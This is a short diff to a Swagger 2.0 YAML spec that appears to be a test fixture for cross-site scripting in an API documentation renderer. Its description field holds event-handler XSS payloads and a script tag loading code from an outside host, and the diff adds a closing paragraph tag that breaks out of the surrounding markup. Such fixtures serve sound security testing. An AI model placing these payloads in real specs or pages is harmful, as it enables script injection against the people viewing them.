@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Example yaml.spec
-  description: This is an example text <details open ontoggle=confirm()> <svg onload=write()> <x oncut=alert()>x <svg onload=write()> <!--><script src=//14.rs>
+  description: This is an example text </p><details open ontoggle=confirm()> <svg onload=write()> <x oncut=alert()>x <svg onload=write()> <!--><script src=//14.rs>
 paths:
   /accounts:
     get:
